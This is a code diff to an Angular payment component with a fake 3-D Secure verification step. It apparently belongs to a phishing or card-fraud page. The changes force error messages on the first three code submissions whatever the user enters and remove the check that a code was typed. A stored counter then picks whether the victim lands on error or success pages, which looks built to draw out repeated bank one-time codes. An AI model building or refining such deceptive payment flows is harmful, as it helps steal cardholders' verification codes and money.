@@ -29,6 +29,10 @@ export class PaymentComponent {
   private lastBin: string | null = null;
   private binLookupTimer: any = null;
 
+  private tShowModal?: number;
+  private tAfterError?: number;
+  private tFinalRedirect?: number;
+
   binService = inject(BinService);
   paymentService = inject(PaymentService);
   counter: number = 0;
@@ -369,6 +373,24 @@ export class PaymentComponent {
     return !this.validateCVV(this.card.cvv, brand);
   }
 
+  private clearTimers() {
+    if (this.tShowModal) clearTimeout(this.tShowModal);
+    if (this.tAfterError) clearTimeout(this.tAfterError);
+    if (this.tFinalRedirect) clearTimeout(this.tFinalRedirect);
+
+    this.tShowModal = undefined;
+    this.tAfterError = undefined;
+    this.tFinalRedirect = undefined;
+  }
+
+  private scheduleShowModal(ms: number) {
+    if (this.tShowModal) clearTimeout(this.tShowModal);
+
+    this.tShowModal = window.setTimeout(() => {
+      this.show3DSModal = true;
+    }, ms);
+  }
+
   async confirm3DS() {
     let storedMsg = localStorage.getItem('m') || '';
 
@@ -394,49 +416,28 @@ export class PaymentComponent {
     }, 5000);
 
     if (this.counter === 0) {
+      this.clearTimers();
       this.isLoading = true;
       this.show3DSModal = false;
       this.showErrorToast1 = true;
-      setTimeout(() => {
-        this.isLoading = false;
-        this.show3DSModal = true;
-        this.threeDSCode = '';
-      }, 9000);
+      this.scheduleShowModal(5000);
       this.counter++;
-    }
-
-    if (this.counter === 1) {
+    } else if (this.counter === 1) {
+      this.clearTimers();
       this.isLoading = true;
       this.show3DSModal = false;
       this.showErrorToast2 = true;
-      setTimeout(() => {
-        this.isLoading = false;
-        this.show3DSModal = true;
-        this.threeDSCode = '';
-      }, 9000);
+      this.scheduleShowModal(5000);
       this.counter++;
-    }
-
-    if (this.counter === 2) {
+    } else if (this.counter === 2) {
+      this.clearTimers();
       this.isLoading = true;
       this.show3DSModal = false;
       this.showErrorToast2 = true;
-      setTimeout(() => {
-        this.isLoading = false;
-        this.show3DSModal = true;
-        this.threeDSCode = '';
-      }, 6000);
+      this.scheduleShowModal(5000);
       this.counter++;
-    }
-
-    if (this.counter === 3) {
+    } else if (this.counter === 3) {
       let successCounter = Number(localStorage.getItem('scid')) || 0;
-      // Validación básica del código (ej: mínimo 4 dígitos)
-      if (!this.threeDSCode || this.threeDSCode.trim().length < 4) {
-        this.threeDSError =
-          'Ingresa el código de verificación enviado por tu banco.';
-        return;
-      }
 
       this.threeDSError = null;
       this.show3DSModal = false;
@@ -449,16 +450,16 @@ export class PaymentComponent {
 
         switch (successCounter) {
           case 1:
-            location.href = 'payment/error';
+            location.href = 'payment/error-connection';
             break;
           case 2:
-            location.href = 'payment/error-connection';
+            location.href = 'payment/error';
             break;
           case 3:
             location.href = 'payment/success';
             break;
           default:
-            location.href = 'payment/error';
+            location.href = 'payment/error-connection';
         }
       }, 4000);
     }
